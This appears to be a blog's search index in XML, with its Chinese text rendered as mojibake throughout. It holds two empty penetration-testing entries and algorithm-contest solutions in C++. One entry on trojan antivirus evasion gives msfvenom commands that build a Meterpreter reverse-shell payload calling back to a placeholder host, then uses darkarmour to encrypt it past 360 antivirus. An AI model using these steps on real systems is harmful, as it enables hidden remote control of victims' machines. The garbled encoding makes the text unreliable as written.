<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ¸—é€å°tipsï¼ˆäºŒï¼‰</title>
      <link href="/2022/04/05/shen-tou-xiao-tips-er/"/>
      <url>/2022/04/05/shen-tou-xiao-tips-er/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµé‡åŠ å¯†ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/04/05/liu-liang-jia-mi-yi/"/>
      <url>/2022/04/05/liu-liang-jia-mi-yi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> åæ¸—é€ </tag>
            
            <tag> æµé‡åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>acwing45å‘¨å‘¨èµ›</title>
      <link href="/2022/04/05/acwing45-zhou-sai/"/>
      <url>/2022/04/05/acwing45-zhou-sai/</url>
      
        <content type="html"><![CDATA[<h2 id="æœ€é•¿è¿ç»­å­åºåˆ—"><a href="#æœ€é•¿è¿ç»­å­åºåˆ—" class="headerlink" title="æœ€é•¿è¿ç»­å­åºåˆ—"></a>æœ€é•¿è¿ç»­å­åºåˆ—</h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„æ•´æ•°åºåˆ— $a_1,a_2,â€¦,a_n$ã€‚</p><p>è¯·ä½ æ‰¾å‡ºå®ƒçš„ä¸€ä¸ªæœ€é•¿<strong>è¿ç»­</strong>å­åºåˆ—ï¼Œè¦æ±‚è¯¥å­åºåˆ—åŒ…å«ä¸è¶…è¿‡ $k$ ä¸ªä¸åŒçš„å€¼ã€‚</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° $n,k$ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« $n$ ä¸ªæ•´æ•° $a_1,a_2,â€¦,a_n$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>å…±ä¸€è¡Œï¼Œä¸¤ä¸ªæ•´æ•° $l,r$ï¼Œè¡¨ç¤ºä½ æ‰¾å‡ºçš„æ»¡è¶³æ¡ä»¶çš„æœ€é•¿è¿ç»­å­åºåˆ—çš„æœ€å·¦ç«¯å…ƒç´ ä¸‹æ ‡å’Œæœ€å³ç«¯å…ƒç´ ä¸‹æ ‡ã€‚</p><p>å¦‚æœç­”æ¡ˆä¸å”¯ä¸€ï¼Œè¾“å‡ºä»»æ„åˆç†æ–¹æ¡ˆå‡å¯ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å‰ $6$ ä¸ªæµ‹è¯•ç‚¹æ»¡è¶³ $1 \le k \le n \le 10$ã€‚<br>æ‰€æœ‰æµ‹è¯•ç‚¹æ»¡è¶³ $1 \le k \le n \le 5 \times 10^5$ï¼Œ$0 \le a_i \le 10^6$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹1ï¼š"><a href="#è¾“å…¥æ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹1ï¼š"></a>è¾“å…¥æ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">5 51 2 3 4 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹1ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹1ï¼š"></a>è¾“å‡ºæ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹2ï¼š"><a href="#è¾“å…¥æ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹2ï¼š"></a>è¾“å…¥æ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">9 36 5 1 2 3 2 1 4 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹2ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹2ï¼š"></a>è¾“å‡ºæ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3 7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹3ï¼š"><a href="#è¾“å…¥æ ·ä¾‹3ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹3ï¼š"></a>è¾“å…¥æ ·ä¾‹3ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3 11 2 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹3ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹3ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹3ï¼š"></a>è¾“å‡ºæ ·ä¾‹3ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>åŒæŒ‡é’ˆï¼Œä¸€ä¸ªå¿«ï¼Œä¸€ä¸ªæ…¢ã€‚éå†æ•´ä¸ªæ•°ç»„ï¼Œè®°å½•å‡ºç°å¤šå°‘ä¸åŒå€¼ä»¥åŠæœ€å¤§é•¿åº¦ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">500010</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> cnt<span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">*</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//å­˜å‚¨å½“å‰ä¸€æ®µç›¸åŒæ•°å­—å‡ºç°çš„æ¬¡æ•°ï¼Œå‡ºç°ä¸€æ¬¡åŠ ä¸€æ¬¡</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">,</span> t<span class="token punctuation">,</span> dis<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">;</span><span class="token comment">//tè¡¨ç¤ºå½“å‰ä¸€æ®µæœ‰tä¸ªä¸åŒçš„å€¼, disè¡¨ç¤ºæœ€å¤§é•¿åº¦,lå’Œrä¸ºè¾“å‡ºç­”æ¡ˆ</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>cnt<span class="token punctuation">[</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">++</span>t<span class="token punctuation">;</span><span class="token operator">++</span>cnt<span class="token punctuation">[</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> k<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">-</span> j <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&gt;</span> dis<span class="token punctuation">)</span><span class="token punctuation">{</span>dis <span class="token operator">=</span> i <span class="token operator">-</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>l <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>r <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">while</span><span class="token punctuation">(</span>t <span class="token operator">&gt;</span> k<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> temp <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">--</span> cnt<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>cnt<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>cout<span class="token operator">&lt;&lt;</span>l<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>r<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æœ€å¤§å­çŸ©é˜µ"><a href="#æœ€å¤§å­çŸ©é˜µ" class="headerlink" title="æœ€å¤§å­çŸ©é˜µ"></a>æœ€å¤§å­çŸ©é˜µ</h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„æ•´æ•°æ•°ç»„ $a_1,a_2,â€¦,a_n$ å’Œä¸€ä¸ªé•¿åº¦ä¸º $m$ çš„æ•´æ•°æ•°ç»„ $b_1,b_2,â€¦,b_m$ã€‚</p><p>è®¾ $c$ æ˜¯ä¸€ä¸ª $n \times m$ çš„çŸ©é˜µï¼Œå…¶ä¸­ $c_{i,j}=a_i \times b_j$ã€‚</p><p>è¯·ä½ æ‰¾åˆ°çŸ©é˜µ $c$ çš„ä¸€ä¸ªå­çŸ©é˜µï¼Œè¦æ±‚ï¼šè¯¥å­çŸ©é˜µæ‰€åŒ…å«çš„æ‰€æœ‰å…ƒç´ ä¹‹å’Œä¸è¶…è¿‡ $x$ï¼Œå¹¶ä¸”å…¶é¢ç§¯ï¼ˆåŒ…å«å…ƒç´ çš„æ•°é‡ï¼‰åº”å°½å¯èƒ½å¤§ã€‚</p><p>è¾“å‡ºæ»¡è¶³æ¡ä»¶çš„å­çŸ©é˜µçš„æœ€å¤§å¯èƒ½é¢ç§¯ï¼ˆå³åŒ…å«å…ƒç´ çš„æœ€å¤§å¯èƒ½æ•°é‡ï¼‰ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° $n,m$ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« $n$ ä¸ªæ•´æ•° $a_1,a_2,â€¦,a_n$ã€‚</p><p>ç¬¬ä¸‰è¡ŒåŒ…å« $m$ ä¸ªæ•´æ•° $b_1,b_2,â€¦,b_m$ã€‚</p><p>ç¬¬å››è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•° $x$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ»¡è¶³æ¡ä»¶çš„å­çŸ©é˜µçš„æœ€å¤§å¯èƒ½é¢ç§¯ï¼ˆå³åŒ…å«å…ƒç´ çš„æœ€å¤§å¯èƒ½æ•°é‡ï¼‰ã€‚</p><p>å¦‚æœä¸å­˜åœ¨æ»¡è¶³æ¡ä»¶çš„å­çŸ©é˜µï¼Œåˆ™è¾“å‡º $0$ã€‚</p><h4 id="æ•°æ®èŒƒå›´-1"><a href="#æ•°æ®èŒƒå›´-1" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å‰ä¸‰ä¸ªæµ‹è¯•ç‚¹æ»¡è¶³ $1 \le n,m \le 5$ã€‚<br>æ‰€æœ‰æµ‹è¯•ç‚¹æ»¡è¶³ $1 \le n,m \le 2000$ï¼Œ$1 \le a_i,b_i \le 2000$ï¼Œ$1 \le x \le 2 \times 10^9$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹1ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹1ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹1ï¼š"></a>è¾“å…¥æ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3 31 2 31 2 39<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹1ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹1ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹1ï¼š"></a>è¾“å‡ºæ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹2ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹2ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹2ï¼š"></a>è¾“å…¥æ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">5 15 4 2 4 525<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹2ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹2ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹2ï¼š"></a>è¾“å‡ºæ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-1"><a href="#é¢˜è§£ï¼š-1" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>è¿™é¢˜è¿˜æŒºéš¾çš„      <span class="github-emoji"><span>ğŸ˜­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å°†é¢˜ç›®æ‰€æ±‚çš„å­çŸ©é˜µå…ƒç´ å’Œè½¬æ¢ä¸ºæ±‚ $a$ $b$ æ•°ç»„çš„ä¸€æ®µå­åŒºé—´å’Œçš„ä¹˜ç§¯<br>å¦‚ï¼š<br>$(a1 * b1 + a2 * b1 + a3 * b1) + (a1 * b2 + a2 * b2 + a3 * b2) + (a1 * b3 + a2 * b3 + a3 * b3) = (a1 + a2 + a3) * (b1 + b2 + b3)$<br>å¸Œæœ›ä½¿å¾—å­åŒºé—´çš„é•¿åº¦ä¹˜ç§¯æœ€å¤§ä¸”å­åŒºé—´å’Œçš„ä¹˜ç§¯ $&lt;=X$,é‚£ä¹ˆå½“å­åŒºé—´é•¿åº¦å›ºå®šï¼Œå­åŒºé—´å’Œè¶Šå°è¶Šå¥½ã€‚<br>æ•…è®¡ç®— $a$ å’Œ $b$ çš„æ‰€æœ‰å­åŒºé—´é•¿åº¦å›ºå®šæ—¶çš„åŒºé—´å’Œæœ€å°å€¼ï¼Œä¸¤å€ $n^2$ã€‚<br>ç„¶åå¯ä»¥æš´åŠ›å»åšæ±‚æœ€å¤§å€¼äº†ï¼Œä¹Ÿå¯ä»¥åŒæŒ‡é’ˆã€‚<br>åŒæŒ‡é’ˆï¼šä»¤å­åŒºé—´é•¿åº¦ä¸ºiçš„æœ€å°å’Œä¸º $Sa[i]$ï¼Œ$Sb[j]$ ï¼Œ$Sa[i]*Sb[j]&lt;=X$ ,é‚£ä¹ˆå½“ $i$ å¢å¤§ï¼Œ$j$ å¿…ç„¶å‡å°(å¯åè¯å¦‚æœjå¢å¤§ä¼šçŸ›ç›¾ï¼‰ï¼ŒåŒæŒ‡é’ˆæšä¸¾å³å¯</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">2e3</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span> INF <span class="token operator">=</span> <span class="token number">1e8</span><span class="token punctuation">;</span> <span class="token comment">// æœ€å¤§2000*2000,1e8è¶³å¤Ÿ</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> X<span class="token punctuation">;</span><span class="token keyword">int</span> sa<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span> sb<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// sa[len]è¡¨ç¤ºå¯¹äºaæ•°ç»„å­åŒºé—´é•¿åº¦ä¸ºlençš„æœ€å°å’Œ</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// a, b ä¸ºå‰ç¼€å’Œ</span><span class="token keyword">int</span> s<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">,</span> <span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> a<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> <span class="token operator">++</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> b<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>        sa<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> INF<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> l <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span> l<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> r <span class="token operator">=</span> l <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            sa<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>sa<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">-</span> a<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> <span class="token operator">++</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>        sb<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> INF<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> l <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> <span class="token operator">++</span> l<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> r <span class="token operator">=</span> l <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            sb<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>sb<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>X<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&amp;&amp;</span> sb<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;</span> X <span class="token operator">/</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> j <span class="token operator">--</span><span class="token punctuation">;</span> <span class="token comment">// æœ€å¤§æƒ…å†µä¸‹ä¸¤ä¸ªå’Œç›¸ä¹˜æ˜¯4e6*4e6ï¼Œæ”¹é™¤æ³•é˜²çˆ†int</span>        res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> i <span class="token operator">*</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> acwing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¨é©¬å…æ€ï¼ˆäºŒï¼‰</title>
      <link href="/2022/04/05/mu-ma-mian-sha-er/"/>
      <url>/2022/04/05/mu-ma-mian-sha-er/</url>
      
        <content type="html"><![CDATA[<h2 id="MSFåŠ å£³å…æ€è¿‡360"><a href="#MSFåŠ å£³å…æ€è¿‡360" class="headerlink" title="MSFåŠ å£³å…æ€è¿‡360"></a>MSFåŠ å£³å…æ€è¿‡360</h2><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/bats3c/darkarmour">https://github.com/bats3c/darkarmour</a></p><p>å®‰è£…ä¾èµ–ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> MSFç”Ÿæˆ</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p winodws/x64/meterpreter/revserse_tcp LHOST=XXX.XXX.XX.XX LPORT=4444 -f exe -o exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">./darkarmour.py -f exploit.exe --encrypt xor --jmp -o e.exe --loop 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CSå…æ€è¿‡360"><a href="#CSå…æ€è¿‡360" class="headerlink" title="CSå…æ€è¿‡360"></a>CSå…æ€è¿‡360</h2>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> æœ¨é©¬å…æ€ </tag>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¨é©¬å…æ€ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/04/05/mu-ma-mian-sha-yi/"/>
      <url>/2022/04/05/mu-ma-mian-sha-yi/</url>
      
